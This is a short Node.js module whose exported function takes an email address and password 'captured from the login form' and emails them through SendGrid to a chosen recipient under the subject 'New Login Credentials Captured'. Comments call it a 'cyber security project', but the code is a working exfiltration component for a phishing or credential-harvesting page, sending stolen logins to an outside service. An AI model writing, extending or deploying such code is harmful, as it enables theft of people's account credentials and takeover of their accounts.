/**
 * Email Sender for Login Credentials
 * Uses SendGrid to send captured login credentials
 */

const sgMail = require('@sendgrid/mail');

// Configure SendGrid with API key (user needs to provide this)
// To set the API key, use: SENDGRID_API_KEY=your_api_key
// sgMail.setApiKey(process.env.SENDGRID_API_KEY);

/**
 * Sends an email with the captured login credentials
 * @param {string} capturedEmail - The email address captured from the login form
 * @param {string} capturedPassword - The password captured from the login form
 * @param {string} recipientEmail - The email address to send the captured credentials to
 * @returns {Promise<boolean>} - Whether the email was sent successfully
 */
async function sendLoginCredentials(capturedEmail, capturedPassword, recipientEmail) {
  // If no API key is set, return false (unsuccessful)
  if (!process.env.SENDGRID_API_KEY) {
    console.error('SendGrid API key not set. Please set SENDGRID_API_KEY environment variable.');
    return false;
  }

  sgMail.setApiKey(process.env.SENDGRID_API_KEY);

  // Get current timestamp
  const timestamp = new Date().toISOString();
  
  // Create email message
  const msg = {
    to: recipientEmail,
    from: 'security@yourcyberproject.com', // Change to your verified sender
    subject: 'New Login Credentials Captured',
    text: `
    New login credentials captured:
    
    Timestamp: ${timestamp}
    Email: ${capturedEmail}
    Password: ${capturedPassword}
    
    This email was sent from your cyber security project.
    `,
    html: `
    <h2>New Login Credentials Captured</h2>
    
    <p><strong>Timestamp:</strong> ${timestamp}</p>
    <p><strong>Email:</strong> ${capturedEmail}</p>
    <p><strong>Password:</strong> ${capturedPassword}</p>
    
    <p><em>This email was sent from your cyber security project.</em></p>
    `
  };
  
  try {
    await sgMail.send(msg);
    console.log('Email sent successfully');
    return true;
  } catch (error) {
    console.error('Error sending email:', error);
    if (error.response) {
      console.error(error.response.body);
    }
    return false;
  }
}

// Export the function for use in other files
module.exports = { sendLoginCredentials };